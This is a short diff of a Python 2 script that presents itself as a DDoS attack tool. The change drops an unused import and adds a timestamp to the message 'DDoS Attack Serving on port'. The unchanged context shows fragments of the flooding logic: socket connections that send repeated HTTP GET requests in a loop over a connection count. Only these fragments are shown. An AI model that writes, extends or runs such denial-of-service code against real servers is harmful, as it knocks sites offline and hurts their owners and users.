@@ -2,7 +2,6 @@
 """
 """
 import time, socket, os, sys, string, random, subprocess
-import httplib
 from flask import Flask
 from colorama import *
 init()
@@ -78,7 +77,7 @@ def main():
 			        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
         		except socket.error, msg:
         			print("[!] [Connection Failed]")
-        		print("[DDoS Attack Serving on port: %s..]" % port)
+        		print("[" + time.ctime(time.time()) + "]" + " [DDoS Attack Serving on port: %s..]" % port)
         		ddos.close()
         	
         	for i in xrange(int(conn)):
